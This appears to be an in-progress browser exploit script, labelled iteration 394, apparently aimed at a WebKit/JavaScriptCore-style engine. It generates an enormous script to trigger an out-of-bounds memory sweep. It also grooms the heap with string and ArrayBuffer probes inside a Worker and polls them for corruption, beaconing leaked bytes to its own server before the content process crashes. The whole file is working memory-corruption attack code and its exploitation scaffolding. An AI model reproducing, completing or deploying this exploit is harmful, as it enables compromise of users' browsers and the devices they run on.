// p394 - RACE SCAN: Worker polls probes DURING the sweep
//
// V393 IIFE works (triggers finishCreation) but the 4.3GB sweep crashes
// the WebContent process when it hits unmapped pages. The Worker dies too,
// so no scan results are reported.
//
// FIX: Worker starts polling probes BEFORE the main thread loads the script.
// Poll runs every 1ms checking .length of string probes and specific bytes
// of AB probes. When corruption is detected, synchronous XHR beacon fires
// IMMEDIATELY -- before the main thread crash kills the process.
//
// The sweep corrupts probes early (within first ~3MB = ~3ms).
// The crash happens much later (unmapped pages at ~10-50MB = ~10-50ms).
// Worker has a ~7-47ms window to detect and beacon.
//
// Beacon prefix: V394-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V394-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {}
  }

  B('BOOT');

  var workerCode = function() {
    var baits = [];
    var strProbes = [];
    var abProbes = [];
    var abViews = [];
    var baseUrl = '';
    var STR_LEN = 100092;
    var AB_SIZE = 100112;
    var polling = false;
    var pollCount = 0;
    var foundCorrupt = false;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V394-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }
    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    function makeStr(len, ch) {
      var s = '';
      for (var i = 0; i < 100; i++) s += ch;
      var reps = Math.ceil(len / 100);
      var result = '';
      for (var i = 0; i < reps; i++) result += s;
      result = result.substring(0, len);
      result.charCodeAt(0);
      return result;
    }

    function pollProbes() {
      if (!polling) return;
      pollCount++;

      // Check string probes - just .length (fast)
      for (var pi = 0; pi < strProbes.length; pi++) {
        try {
          var len = strProbes[pi].length;
          if (len !== STR_LEN) {
            if (!foundCorrupt) {
              foundCorrupt = true;
              beacon('RACE-HIT-POLL' + pollCount);
            }
            beacon('RACE-S' + pi + '-LEN-' + len);

            // Quick char scan at key offsets
            var s = strProbes[pi];
            var scanLen = Math.min(len, 1000);
            var nonA = 0;
            for (var j = 0; j < scanLen; j++) {
              if (s.charCodeAt(j) !== 0x41) {
                nonA++;
                if (nonA <= 5) beacon('RACE-S' + pi + '-NONA-' + j + '-' + hexByte(s.charCodeAt(j) & 0xFF));
              }
            }
            beacon('RACE-S' + pi + '-SCAN1K-NONA' + nonA);
          }
        } catch(ex) {}
      }

      // Check AB probes - spot check specific stride offsets
      for (var pi = 0; pi < abProbes.length; pi++) {
        try {
          var v = abViews[pi];
          // Check entry+24 (thunk pointer), entry+64 (bits), entry+68 (bytecodeIndex)
          // at offsets 24, 64, 68, 136, 176, 180 (first 2 entries worth)
          var checkOffsets = [0, 4, 8, 12, 24, 64, 68, 112, 136, 176, 180];
          for (var ci = 0; ci < checkOffsets.length; ci++) {
            var off = checkOffsets[ci];
            if (off < AB_SIZE && v[off] !== 0x42) {
              if (!foundCorrupt) {
                foundCorrupt = true;
                beacon('RACE-HIT-POLL' + pollCount);
              }
              beacon('RACE-A' + pi + '-OFF' + off + '-' + hexByte(v[off]));
              // Read 8 bytes at this offset
              var hex8 = '';
              for (var b = 0; b < 8 && (off + b) < AB_SIZE; b++) hex8 += hexByte(v[off + b]);
              beacon('RACE-A' + pi + '-BYTES' + off + '-' + hex8);
            }
          }
        } catch(ex) {}
      }

      // Continue polling
      setTimeout(pollProbes, 1);
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') { baseUrl = e.data.baseUrl; beacon('ALIVE'); return; }

      if (e.data.cmd === 'alloc') {
        // 20 string baits
        for (var i = 0; i < 20; i++) baits.push(makeStr(STR_LEN, 'A'));
        beacon('SBAITS-' + baits.length);

        // 5 string probes
        for (var i = 0; i < 5; i++) strProbes.push(makeStr(STR_LEN, 'A'));
        beacon('SPROBES-' + strProbes.length);

        // 5 AB probes
        for (var i = 0; i < 5; i++) {
          var ab = new ArrayBuffer(AB_SIZE);
          var v = new Uint8Array(ab);
          for (var j = 0; j < AB_SIZE; j++) v[j] = 0x42;
          abProbes.push(ab);
          abViews.push(v);
        }
        beacon('ABPROBES-' + abProbes.length);

        // Free string baits
        for (var i = 0; i < baits.length; i++) baits[i] = null;
        baits = [];
        beacon('FREED');

        // START POLLING IMMEDIATELY
        polling = true;
        beacon('POLLING-START');
        pollProbes();

        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'stop') {
        polling = false;
        beacon('POLLING-STOP-' + pollCount + '-FOUND-' + (foundCorrupt ? 'YES' : 'NO'));
        self.postMessage({ done: true, foundCorrupt: foundCorrupt, pollCount: pollCount });
      }
    };
  };

  var workerBlob = new Blob(['(' + workerCode.toString() + ')()'], { type: 'application/javascript' });
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: location.protocol + '//' + location.host });

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY-POLLING');
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
        gcR++;
        if (gcR < 30) setTimeout(gc, 30);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
    if (e.data.done) {
      B('SCAN-DONE-FOUND-' + (e.data.foundCorrupt ? 'YES' : 'NO') + '-POLLS-' + e.data.pollCount);
    }
  };

  worker.postMessage({ cmd: 'alloc' });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    // IIFE pattern: function IS called, a is parameter (pure op_call)
    // if(guard) prevents execution of calls (no crash from OOB metadata reads)
    // BUT the sweep still writes 4.3GB and may crash on unmapped pages
    // Worker is polling concurrently to catch corruption before crash
    var cc = 'a();'.repeat(CHUNK);
    var p = [
      '(function(a){if(window.____x394){',
    ];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('}})(function(){});window.__p394ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p394ok ? 'OK' : 'FAIL'));
      // If we get here, sweep completed without crash!
      // Stop polling and do a final thorough scan
      worker.postMessage({ cmd: 'stop' });
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
